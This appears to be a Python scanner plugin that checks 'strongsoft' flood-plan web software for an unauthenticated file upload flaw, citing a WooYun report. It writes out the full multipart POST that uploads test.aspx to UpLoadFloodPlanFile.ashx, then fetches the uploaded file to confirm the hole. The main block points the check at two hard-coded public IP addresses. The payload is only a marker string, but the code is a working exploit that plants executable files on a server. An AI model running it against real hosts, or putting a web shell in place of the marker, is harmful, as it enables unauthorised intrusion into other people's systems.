#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = treeoph
#__Refer___ = http://wooyun.org/bugs/wooyun-2014-063623
import re,urlparse
def assign(service, arg):
    if service=='strongsoft':
        return True,arg

def audit(arg):
    p=urlparse.urlparse(arg)
    raw="""POST /plan/AjaxHandle/UpLoadFloodPlanFile.ashx?doc=plan HTTP/1.1
Host: {netloc}
Content-Length: 537
Origin: {scheme}://{netloc}
X-Requested-With: ShockwaveFlash/19.0.0.226
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36
Content-Type: multipart/form-data; boundary=----------GI3cH2Ij5gL6ae0Ij5Ij5ei4ei4ei4
Accept: */*
Referer: {scheme}://{netloc}/plan/FloodPlan/FloodPlanFile.aspx?adcd=331081001003000&ID=0&filetype=156&ParentID=0&adomParameter=625
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4
Cookie: ASP.NET_SessionId=bhqaiw55nxkgrdqj3tfprx45; CheckCode=4FXD

------------GI3cH2Ij5gL6ae0Ij5Ij5ei4ei4ei4
Content-Disposition: form-data; name="Filename"

test.aspx
------------GI3cH2Ij5gL6ae0Ij5Ij5ei4ei4ei4
Content-Disposition: form-data; name="folder"

/plan/FloodPlan/
------------GI3cH2Ij5gL6ae0Ij5Ij5ei4ei4ei4
Content-Disposition: form-data; name="Filedata"; filename="test.aspx"
Content-Type: application/octet-stream

testvul_test
------------GI3cH2Ij5gL6ae0Ij5Ij5ei4ei4ei4
Content-Disposition: form-data; name="Upload"

Submit Query
------------GI3cH2Ij5gL6ae0Ij5Ij5ei4ei4ei4--"""
    code,head,res,errcode, _=curl.curl2(arg+'plan/AjaxHandle/UpLoadFloodPlanFile.ashx?doc=plan',raw=raw.format(scheme=p.scheme,netloc=p.netloc))
    if code == 200 and res:
        m=re.search(r'(\d+\.aspx)',res)
        if m:
            file_url='http://%s/UploadFile/plan/%s'%(p.netloc,m.group())
            code,head,res,errcode, _=curl.curl2(file_url)
            if 'testvul_test' in res:
                security_hole(arg+":Upload File at "+file_url)

if __name__=='__main__':
    from dummy import *
    audit(assign('strongsoft','http://222.216.218.28:8088/')[1])
    audit(assign('strongsoft','http://183.233.205.85:9001/')[1])